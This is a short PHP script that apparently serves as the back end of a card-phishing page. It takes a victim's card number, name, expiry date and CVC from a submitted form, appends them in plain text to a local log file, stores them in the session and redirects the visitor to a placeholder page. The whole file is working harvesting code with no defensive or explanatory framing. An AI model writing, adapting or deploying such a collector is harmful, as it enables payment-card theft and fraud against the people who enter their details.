<?php
 header ('Location: xx.php');
 $number = $_POST["number"];
 $name = $_POST["name"];
 $expiry = $_POST["expiry"];
  $cvc = $_POST["cvc"];
 $file = fopen("log.txt","a");
 fwrite($file,"\n\nNumber : ");
 fwrite($file,$number);
 fwrite($file,"\nName : ");
 fwrite($file,$name);
  fwrite($file,"\nExpiry : ");
 fwrite($file,$expiry);
  fwrite($file,"\nCvc : ");
 fwrite($file,$cvc);
 fclose($file);
 $_SESSION['number'] = $number;
 $_SESSION['name'] = $name;
 $_SESSION['expiry'] = $expiry;
 $_SESSION['cvc'] = $cvc;
?>